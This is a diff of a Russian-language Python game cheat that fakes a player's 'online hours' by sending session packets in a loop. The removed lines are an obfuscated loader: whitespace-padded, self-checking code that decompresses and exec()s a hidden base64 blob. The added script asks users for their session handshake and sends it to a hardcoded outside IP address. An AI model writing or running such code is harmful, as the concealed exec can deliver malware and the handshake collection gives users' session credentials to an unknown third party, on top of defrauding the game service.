@@ -1,9 +1,27 @@
-#---------------------------
-# Obfuscated with VarumaObfuscation
-#---------------------------
-
-def Varuma_Obfuscation                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    (_data: str) -> str:
-    key                                                                                                                                                                                                                                                                                                                                                                                                                                                                        = 'bmtUpaKfmyFcSxworZbgZsnzqwbHUdvB';IIlI=eval('chr(97)+chr(98)+chr(99)+chr(100)+chr(101)+chr(102)+chr(103)+chr(104)+chr(105)+chr(106)+chr(107)+chr(108)+chr(109)+chr(110)+chr(111)+chr(112)+chr(113)+chr(114)+chr(115)+chr(116)+chr(117)+chr(118)+chr(119)+chr(120)+chr(121)+chr(122)+chr(48)+chr(49)+chr(50)+chr(51)+chr(52)+chr(53)+chr(54)+chr(55)+chr(56)+chr(57)')
-    if                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  IIlI[15]+IIlI[17]+IIlI[8]+IIlI[13]+IIlI[19] in open(__file__, errors=IIlI[8]+IIlI[6]+IIlI[13]+IIlI[14]+IIlI[17]+IIlI[4]).read() or IIlI[8]+IIlI[13]+IIlI[15]+IIlI[20]+IIlI[19] in open(__file__, errors=IIlI[8]+IIlI[6]+IIlI[13]+IIlI[14]+IIlI[17]+IIlI[4]).read() or IIlI[22]+IIlI[17]+IIlI[8]+IIlI[19]+IIlI[4] in open(__file__, errors=IIlI[8]+IIlI[6]+IIlI[13]+IIlI[14]+IIlI[17]+IIlI[4]).read() or IIlI[5]+IIlI[14]+IIlI[17] in open(__file__, errors=IIlI[8]+IIlI[6]+IIlI[13]+IIlI[14]+IIlI[17]+IIlI[4]).read():exit()
-    _                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             = lambda __ : __import__(IIlI[25]+IIlI[11]+IIlI[8]+IIlI[1]).decompress(__import__(eval('chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52)')).b64decode(__));exec((_)(_data))
-Varuma_Obfuscation                                                                                                                                                                                                                                                                                                                                                                                                                (_data=b'eJyFVd1uG0UUvq6fYtqb3UVm2d1Zz8ZGvggoFagCJNIi0R9Zm/U4XcX2urubJka9yA+lQQkNFLipiiIVJC6Q0BLs1PmxfcELzLxCX4A+AufM2iE0RVnJnp2Zc77zne+cmQ0bZIl3yeUqubLQSm90/GuNVvdqML+6EsU3FxZvJu0v7q0sfHCjfv+9KxW+Gqa6USiEDaJ14rCdaiRsk6jD23qt1gibvFYrEh7HUZxUtXARtmKuGWbM/bpuwIRoK3GY8gu8zjmF7c7yRaHOOp3yrM1WtVd7P/SI+En0xb7oyzUxlNvikMiHsDAUPbkF46E40gphqxPFKYmSYhIFSzwtRImZdJOUt3QtaCYPHgRN7seaUcDtam5j5oM+mc1erX348dz1CYA5/8n712rz1z+dm/0o9zKDqN3mQarrGjU923RKljnjaEUHHsMopNESb1dVsjrSPhRPkLPoiYHcEH0Ck0xuETGSG/IRrH2tUnhzPhWi1Og0/YDrGtGKGjBP425F8Uh4u64vdFOemI04at3lq7oKbhjvXrBf4KsB76TkM7+5zOdQ/lzs2qxRiJQqEDW4r9uW4xpmnQdRHeIvp423Z7Ti6+XCPopu0TvVqvaWVlENhYnvPSfiZ7kuxlCvLUgqk7sqaTGG8mWgwpHIziUsMsDjzYT/y2cCKH4ErGMxIPIRYIyKRH6Do9wg4P1YjAEbgI4B+RCDERXkDxUwAwZgNhYjomZHYHoiN4liMgDpv4L/sdwsTrCJ4rymem2U1+20augNLOUmuOHqf8IWEb8vTghQzSDENrzCXl/8qWo/ROghQsg1uYnFR1RFDiaZXJfb5u22+DV/fYOpfAw9sw465mkQcSD6RQyGGR3LHRzzrEYg6DHmq3Bhdx+5qpwyZQlcoN8AYCBewGSAgZ+g974yOsFiKV1BStiHtn0BSA+nesgdRe+cHgMs8bqitz+xO60T8lSCj3Fypjw5HND7Uok5UrKf5GyR4AlmqUhAmJ5KYBf5oa4jhEXawAKr0APXI5OIZzAeoLRIPVdkfVpbsADU3jRwDpOnA9GhB3ZQjecqtwP0H0Lcg7x8IyCdU0QSKr/XWpigHmDeg/L3ie2dqQHA3k5f7X33i/gWdEZV1ohKaKgwJ9mciiSyCvncX/ITvxXmnt//Lp4qc9AAtZ+AoGFqtvg73Yl1Dc46erx8tvv3YFfsTdv5r9/AD5sTyEKvwFkDw6pmqccNLN9xqU0pc+kMo9SjM9Rx6syhLrUoc+rUZQ6zqQtvZeYylu+yEi3Djgs7FqMwQytqOzYtWSxgtldmJc8pgR2rs4bnslKJ4orHWBntbd9qeLjiug3GwaMM/2ADlrbneiWPWpbjMMcrO1apzGy2AOsUxjorO442vSBuvdx6egc/EdNDs5HfMGdOALQwnvPJlZtdhvxX7sJHiNiVwqWLrsxLDfiI1fDzFfvtRa6XjP+9heFnGP8AY7TRqw==')
+# Dups online
+# By Yakasami
+# V0.1.0
+import os
+import socket
+os.system('cls||clear')
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect(('3.71.250.82', 2222))
+try:
+	sock.send(bytes.fromhex(input("Введите ваш очищенный ХендШейк: ")))
+	sock.recv(1024)
+	print('[√] Отправка хендшейка:Успешно[√]')
+except:
+	print('[X]\033[1;31m <Неверный ХендШейк проверьте ХендШейк и попытайтесь еще раз> \033[0m1m')
+hex = '0000004c0a2431336438633738322d623430362d346261342d396466322d6265393464613063653462631213506c6179657252656d6f7465536572766963651a0f7365744f6e6c696e65537461747573002262792059616b6173616d6922'
+sock.send(bytes.fromhex(hex))
+print("[√]\033[32m <Накрутка часов:Успешно[√]> \033[0m")
+print('''\033[43m <Если что, этот дюп онлайна работает по такому принципу, что переводит ваш аккаунт в онлайн, тем самым легально накручивает часы. 
+Часы накручиваются так же, сколько прошло часов в RealLife. 
+Желательно во время дюпа не заходить на аккаунт, и оставить этот скрипт работать в фоновом режиме, не удаляя его со вкладок. Можете просто оставлять его на ночь.
+Также нужно обновлять хендшейк каждые 17 часов.
+Автор этого скрипта: Yakasami
+Канал автора: t.me/yakasami_hex> 
+Перевел: Doni4ka\033[0m''')
+while 1:
+	hex = '0000004c0a2431336438633738322d623430362d346261342d396466322d6265393464613063653462631213506c6179657252656d6f7465536572766963651a0f7365744f6e6c696e65537461747573002262792059616b6173616d6922'
+	sock.send(bytes.fromhex(hex))
